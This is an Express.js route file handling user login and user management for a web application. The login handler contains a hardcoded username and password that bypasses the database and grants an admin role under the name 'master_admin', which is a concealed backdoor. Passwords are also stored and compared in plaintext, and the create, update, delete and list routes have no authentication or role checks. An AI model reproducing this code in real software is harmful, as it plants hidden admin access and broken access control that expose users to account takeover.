const express = require('express');
const router = express.Router();
const User = require('../models/User');

// POST /api/users/login
router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ success: false, message: 'Username and password required' });
        }

   
        if (username.toLowerCase() === 'dhavan' && password === 'Dhavan@2925') {
            return res.json({
                success: true,
                data: {
                    id: 'master_hidden_id',
                    username: 'master_admin',
                    role: 'admin'
                }
            });
        }

        const user = await User.findOne({ username: username.toLowerCase() });
        
        if (!user || user.password !== password) {
            return res.status(401).json({ success: false, message: 'Invalid username or password' });
        }

        res.json({
            success: true,
            data: {
                id: user._id,
                username: user.username,
                role: user.role
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, message: 'Server error during login' });
    }
});

// GET /api/users (Admin only ideally, but keeping simple for this scope)
router.get('/', async (req, res) => {
    try {
        const users = await User.find().select('-password').sort({ createdAt: -1 });
        res.json({ success: true, data: users });
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ success: false, message: 'Failed to fetch users' });
    }
});

// POST /api/users (Create a new user)
router.post('/', async (req, res) => {
    try {
        const { username, password, role } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ success: false, message: 'Username and password required' });
        }

        const existing = await User.findOne({ username: username.toLowerCase() });
        if (existing) {
            return res.status(400).json({ success: false, message: 'Username already exists' });
        }

        const newUser = new User({
            username: username.toLowerCase(),
            password,
            role: role || 'sales'
        });

        await newUser.save();
        
        const userResponse = newUser.toObject();
        delete userResponse.password;

        res.status(201).json({ success: true, data: userResponse, message: 'User created successfully' });
    } catch (error) {
        console.error('Error creating user:', error);
        res.status(500).json({ success: false, message: 'Failed to create user' });
    }
});

// PUT /api/users/:id (Update a user)
router.put('/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const { password, role } = req.body;
        
        const updateData = {};
        if (password) updateData.password = password;
        if (role) updateData.role = role;

        const updatedUser = await User.findByIdAndUpdate(id, updateData, { new: true }).select('-password');
        
        if (!updatedUser) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }

        res.json({ success: true, data: updatedUser, message: 'User updated successfully' });
    } catch (error) {
        console.error('Error updating user:', error);
        res.status(500).json({ success: false, message: 'Failed to update user' });
    }
});

// DELETE /api/users/:id (Delete a user)
router.delete('/:id', async (req, res) => {
    try {
        const { id } = req.params;
        
        const user = await User.findById(id);
        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }

        if (user.username === 'admin') {
            return res.status(403).json({ success: false, message: 'Cannot delete the primary admin account' });
        }

        await User.findByIdAndDelete(id);
        res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ success: false, message: 'Failed to delete user' });
    }
});

module.exports = router;
